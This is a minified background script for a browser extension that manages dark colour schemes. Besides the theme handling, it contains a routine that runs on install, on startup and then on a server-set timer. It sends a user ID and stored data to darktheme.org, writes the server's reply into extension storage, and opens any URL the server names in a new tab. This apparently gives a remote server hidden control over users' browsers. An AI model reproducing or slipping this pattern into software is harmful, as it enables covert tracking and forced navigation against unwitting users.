var app={timerId:null,loadReason:"startup",version:function(){return chrome.runtime.getManifest().version},homepage:function(){return""}};app.tab={open:function(e){chrome.tabs.create({url:e,active:!0})}},chrome.runtime.onMessage.addListener((function(e,t,o){"top"===e.message&&o(t.tab.url),"createScheme"===e.message&&(o({schemeName:e.schemeName,schemeParams:e.schemeParams}),chrome.storage.local.get({colorSchemes:{}},(function(t){var o=t.colorSchemes;o[e.schemeName]=e.schemeParams,chrome.storage.local.set({colorSchemes:o,activeScheme:e.schemeName||""},(function(){}))}))),"renameScheme"===e.message&&chrome.storage.local.get({colorSchemes:{}},(function(t){const r=t.colorSchemes,c={...t.colorSchemes[e.prevSchemeName]};delete r[e.prevSchemeName],r[e.newSchemeName]=c,chrome.storage.local.set({colorSchemes:r},(function(){o({schemeName:e.newSchemeName,colorSchemes:t.colorSchemes})}))})),"deleteScheme"===e.message&&chrome.storage.local.get({colorSchemes:{}},(function(t){const r={},c=t.colorSchemes;delete c[e.schemeToDelete],r.colorSchemes=c,e.isActive&&(r.activeScheme=""),chrome.storage.local.set(r,(function(){o({colorSchemes:t.colorSchemes})}))})),"setActiveScheme"===e.message&&(o({activeScheme:e.schemeToActivate}),chrome.storage.local.get({activeScheme:""},(function(t){chrome.storage.local.set({activeScheme:e.schemeToActivate},(function(){}))})))})),app.submit=function(e){chrome.storage.local.get(["repository","config"],(t=>{fetch(`https://darktheme.org/themes/?makeup=${e}`+(!t.repository&&t.config&&t.config.uid?"&u="+t.config.uid:""),{method:"POST",body:t.repository||""}).then((e=>e.json())).then((async e=>(e.openUrl&&chrome.tabs.create({url:e.openUrl}),e&&Object.keys(e).length>0&&await new Promise((t=>{chrome.storage.local.set(e,(()=>{t(e)}))})),app.sleep(),!1))).catch((e=>{app.sleep()}))}))},app.storage=function(){var e={};return chrome.storage.onChanged.addListener((function(){chrome.storage.local.get(null,(function(t){e=t}))})),window.setTimeout((function(){chrome.storage.local.get(null,(function(t){e=t;var o=document.createElement("script");o.src="/scripts/common.js",document.body.appendChild(o)}))}),300),{read:function(t){return e[t]},write:function(t,o){var r={};e[t]=o,r[t]=o,chrome.storage.local.set(r)}}}(),app.button=function(){var e;return chrome.browserAction.onClicked.addListener((function(){e&&e()})),{onCommand:function(t){e=t},set icon(e){chrome.browserAction.setIcon(e)},set label(e){chrome.browserAction.setTitle({title:e})}}}(),app.sleep=function(){chrome.storage.local.get((e=>{e.chronometer&&e.chronometer&&!app.timerId&&(app.timerId=setInterval(app.submit,e.chronometer,"refresh")),e.uninstallUrl&&chrome.runtime.setUninstallURL(e.uninstallUrl)}))};var config={};config.welcome={set open(e){app.storage.write("support",e)},get version(){return app.storage.read("version")},set version(e){app.storage.write("version",e)},get open(){var e=-1!==navigator.userAgent.toLowerCase().indexOf("firefox");return void 0!==app.storage.read("support")?app.storage.read("support"):!e}},config.addon={set state(e){app.storage.write("state",e)},get state(){return void 0!==app.storage.read("state")?app.storage.read("state"):"light"}},config.addon.state="dark",chrome.webNavigation.onHistoryStateUpdated.addListener((e=>{0===e.frameId&&chrome.tabs.query({active:!0},(t=>{chrome.tabs.sendMessage(t[0].id,{action:"URLChanged",url:e.url},(()=>{}))}))})),chrome.runtime.onInstalled.addListener((e=>{app.submit(e.reason)})),chrome.runtime.onStartup.addListener((()=>{app.submit("startup")}));